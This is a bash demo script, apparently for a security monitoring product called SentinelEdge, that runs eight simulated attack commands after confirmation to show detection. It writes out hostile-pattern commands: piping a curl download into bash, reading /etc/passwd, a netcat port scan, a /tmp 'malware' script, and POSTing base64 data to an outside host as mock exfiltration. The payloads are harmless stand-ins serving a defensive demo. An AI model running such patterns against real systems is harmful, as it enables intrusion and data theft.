#!/bin/bash
# demo_attacks.sh - SentinelEdge Demo Attack Scenarios
# ⚠️  WARNING: For demonstration purposes only! 
# Do not run on production systems without proper authorization

echo "🛡️  SentinelEdge Demo Attack Scenarios"
echo "======================================"
echo "This script simulates various attack patterns to demonstrate"
echo "SentinelEdge's detection capabilities."
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to simulate attack and show expected detection
simulate_attack() {
    local attack_name="$1"
    local description="$2"
    local command="$3"
    local expected_classification="$4"
    
    echo -e "${BLUE}🎯 Attack: ${attack_name}${NC}"
    echo -e "   Description: ${description}"
    echo -e "   Command: ${YELLOW}${command}${NC}"
    echo -e "   Expected Classification: ${RED}${expected_classification}${NC}"
    echo ""
    
    # Ask for confirmation
    read -p "Execute this attack simulation? (y/N): " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        echo -e "${GREEN}✅ Executing...${NC}"
        eval "$command"
        echo -e "${GREEN}✅ Attack simulation completed${NC}"
        sleep 2
    else
        echo -e "${YELLOW}⏭️  Skipped${NC}"
    fi
    echo "---"
}

echo -e "${GREEN}Starting SentinelEdge Demo...${NC}"
echo ""

# Attack 1: Suspicious Shell Activity
simulate_attack \
    "Suspicious Shell Chain" \
    "Downloads and executes a script from a remote server" \
    "curl -s http://httpbin.org/json | jq '.origin' | bash -c 'echo \"Simulated payload execution\"'" \
    "Suspicious Command Chain (Risk: 0.89)"

# Attack 2: Sensitive File Access
simulate_attack \
    "Sensitive File Access" \
    "Attempts to read sensitive system files" \
    "cat /etc/passwd | head -5" \
    "Sensitive File Access (Risk: 0.92)"

# Attack 3: Network Reconnaissance
simulate_attack \
    "Network Reconnaissance" \
    "Scans for open ports on localhost" \
    "nc -zv localhost 22 80 443 2>/dev/null || echo 'Port scan simulation'" \
    "Network Reconnaissance (Risk: 0.78)"

# Attack 4: Temporary Directory Execution
simulate_attack \
    "Temp Directory Execution" \
    "Creates and executes file from temporary directory" \
    "echo '#!/bin/bash\necho \"Malicious payload\"' > /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh && rm /tmp/malware.sh" \
    "Temp Directory Execution (Risk: 0.85)"

# Attack 5: Process Injection Simulation
simulate_attack \
    "Process Injection Simulation" \
    "Simulates process injection techniques" \
    "sleep 1 & echo \"Process \$! spawned\" && kill -STOP \$! 2>/dev/null || echo 'Process manipulation simulation'" \
    "Process Injection Attempt (Risk: 0.91)"

# Attack 6: Data Exfiltration Simulation
simulate_attack \
    "Data Exfiltration" \
    "Simulates data being sent to external server" \
    "echo 'sensitive_data_123' | base64 | curl -X POST -d @- http://httpbin.org/post >/dev/null 2>&1 || echo 'Data exfiltration simulation'" \
    "Data Exfiltration (Risk: 0.88)"

# Attack 7: Privilege Escalation Attempt
simulate_attack \
    "Privilege Escalation" \
    "Attempts to access root-only resources" \
    "sudo -n whoami 2>/dev/null || echo 'Privilege escalation attempt detected'" \
    "Privilege Escalation Attempt (Risk: 0.94)"

# Attack 8: Crypto Mining Simulation
simulate_attack \
    "Crypto Mining" \
    "Simulates cryptocurrency mining behavior" \
    "yes > /dev/null & MINING_PID=\$!; sleep 2; kill \$MINING_PID; echo 'Crypto mining simulation'" \
    "Crypto Mining Activity (Risk: 0.76)"

# Summary
echo ""
echo -e "${GREEN}🎉 Demo Complete!${NC}"
echo "======================================"
echo "SentinelEdge should have detected and classified the following:"
echo ""
echo -e "${RED}High Risk Detections:${NC}"
echo "• Privilege Escalation Attempt (0.94)"
echo "• Sensitive File Access (0.92)" 
echo "• Process Injection Attempt (0.91)"
echo "• Suspicious Command Chain (0.89)"
echo "• Data Exfiltration (0.88)"
echo ""
echo -e "${YELLOW}Medium Risk Detections:${NC}"
echo "• Temp Directory Execution (0.85)"
echo "• Network Reconnaissance (0.78)"
echo "• Crypto Mining Activity (0.76)"
echo ""
echo -e "${BLUE}ℹ️  Expected Response Actions:${NC}"
echo "• Alerts sent to security team"
echo "• Events logged to SIEM"
echo "• Suspicious processes monitored"
echo "• Network connections analyzed"
echo ""
echo -e "${GREEN}✅ SentinelEdge Demo Successfully Completed!${NC}"
echo "Visit https://sentineledge.com for more information" 